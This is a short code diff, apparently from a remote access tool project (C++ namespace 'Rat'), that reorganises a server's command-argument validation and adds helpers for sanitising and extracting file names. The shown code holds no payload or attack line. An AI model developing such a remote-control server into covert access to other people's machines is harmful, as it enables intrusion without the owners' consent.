@@ -27,17 +27,26 @@ namespace Rat
         {
             std::string command = list_commands[0];
             std::string object = list_commands[1];
-            if (!checkObjectAndGetId(object, list_commands[1])) 
-            {
-                std::cout << "Server Command Error!\n";
-                return std::vector<std::string>();
-            }
+            // if (!checkObjectAndGetId(object, list_commands[1])) 
+            // {
+            //     std::cout << "Server Command Error!\n";
+            //     return std::vector<std::string>();
+            // }
         }
         else if (list_commands.size() == 3) 
         {
             std::string command = list_commands[0];
             std::string object = list_commands[1];
             std::string argument = list_commands[2];
+            if (!checkObjectAndGetId(object, list_commands[1])) 
+            {
+                std::cout << "Server Command Error!\n";
+                return std::vector<std::string>();
+            }
+        }
+        else if(list_commands.size() == 1) 
+        {
+            
         }
         return list_commands;
     }
@@ -105,5 +114,20 @@ namespace Rat
         }
         std::cout << "Server Error: No Find Socket Id!\n";
         return nullptr;
+    }
+    std::string Utils::sanitizeFileName(const std::string& name) 
+    {
+        std::string sanitized = name;
+        // Thay thế ký tự không hợp lệ bằng '_'
+        std::replace(sanitized.begin(), sanitized.end(), ':', '_');
+        std::replace(sanitized.begin(), sanitized.end(), ' ', '_');
+        std::replace(sanitized.begin(), sanitized.end(), '/', '_');
+        std::replace(sanitized.begin(), sanitized.end(), '\\', '_');
+        return sanitized;
+    }
+    std::string Utils::getFileName(const std::string& path) 
+    {
+        size_t pos = path.find_last_of("/\\");
+        return (pos == std::string::npos) ? path : path.substr(pos + 1);
     }
 }
